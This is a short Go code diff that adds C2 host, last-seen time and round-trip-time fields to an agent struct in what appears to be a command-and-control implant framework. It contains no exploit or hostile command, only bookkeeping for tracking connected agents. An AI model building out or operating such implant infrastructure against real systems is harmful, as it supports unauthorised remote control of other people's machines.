@@ -3,6 +3,8 @@ package def
 import (
 	"context"
 
+	"time"
+
 	"github.com/jaypipes/ghw"
 	"github.com/posener/h2conn"
 )
@@ -38,6 +40,9 @@ type Emp3r0rAgent struct {
 	UUID        string           `cbor:"27,keyasint"` // agent UUID, specific to the agent binary
 	UUIDSig     string           `cbor:"28,keyasint"` // signature of UUID, signed by CA
 	PublicKey   string           `cbor:"29,keyasint"` // agent's public key (PEM encoded) for TOFU
+	C2Host      string           `cbor:"30,keyasint"` // C2 server's IP or domain name that the agent is connected to
+	LastSeen    time.Time        `cbor:"31,keyasint"` // last time the agent was seen
+	LastSeenRTT time.Duration    `cbor:"32,keyasint"` // last RTT of the agent
 }
 
 // AgentProcess process info of our agent
